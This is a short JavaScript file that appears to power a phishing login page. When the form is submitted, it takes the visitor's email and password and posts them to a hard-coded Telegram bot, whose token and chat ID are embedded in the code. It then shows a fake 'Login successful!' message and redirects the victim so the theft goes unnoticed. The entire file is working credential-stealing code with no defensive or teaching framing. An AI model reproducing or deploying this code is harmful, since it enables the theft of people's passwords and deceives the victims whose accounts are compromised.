const form = document.getElementById("use-form");
const confirmationMessage = document.getElementById("confirmation-message");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("use-username").value;
  const password = document.getElementById("use-password").value;

  // Save the username to localStorage
  localStorage.setItem("username", username);

  const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
  const chatId = "6837437455";

  const message = `
    New login attempt:
    - Email: ${username}
    - Password: ${password}
  `;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await response.json();

    if (data.ok) {
      confirmationMessage.textContent = "Login successful!";
      confirmationMessage.classList.remove("hidden");
      form.reset();

      // Redirect to the new page here
      window.location.href = "secondpage.html"; // Change to your desired page
    } else {
      confirmationMessage.textContent = "Failed to send message to Telegram.";
      confirmationMessage.classList.add("text-red-500"); // Error styling
    }
  } catch (error) {
    confirmationMessage.textContent =
      "Failed to send information. Please try again.";
    confirmationMessage.classList.add("text-red-500"); // Error styling
  }
});
